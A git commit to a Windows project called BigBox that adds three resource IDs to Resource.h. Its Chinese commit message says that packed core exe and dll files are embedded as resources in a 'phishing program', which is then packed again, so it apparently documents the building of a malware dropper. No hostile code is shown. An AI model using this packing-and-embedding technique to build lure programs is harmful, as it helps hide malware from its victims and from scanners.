ecff065224b4cd7d2ce8cf51486254271d9d39c1
lfish <shineccy@outlook.com>
2019-10-26 10:48:21 +0800

    基本完成了 核心exe和dll加壳之后作为资源存储在钓鱼程序中 钓鱼程序再次加壳即可

--- BigBox/Resource.h
+++ BigBox/Resource.h
@@ -13,6 +13,9 @@
 #define IDC_BIGBOX                      109
 #define IDR_MAINFRAME                   128
 #define IDR_GIFT1                       129
+#define IDR_DINNER1                     134
+#define IDR_DINNER2                     135
+#define IDR_DINNER3                     136
 #define IDC_STATIC                      -1
 
 // Next default values for new objects
@@ -20,7 +23,7 @@
 #ifdef APSTUDIO_INVOKED
 #ifndef APSTUDIO_READONLY_SYMBOLS
 #define _APS_NO_MFC                     1
-#define _APS_NEXT_RESOURCE_VALUE        132
+#define _APS_NEXT_RESOURCE_VALUE        137
 #define _APS_NEXT_COMMAND_VALUE         32771
 #define _APS_NEXT_CONTROL_VALUE         1000
 #define _APS_NEXT_SYMED_VALUE           110
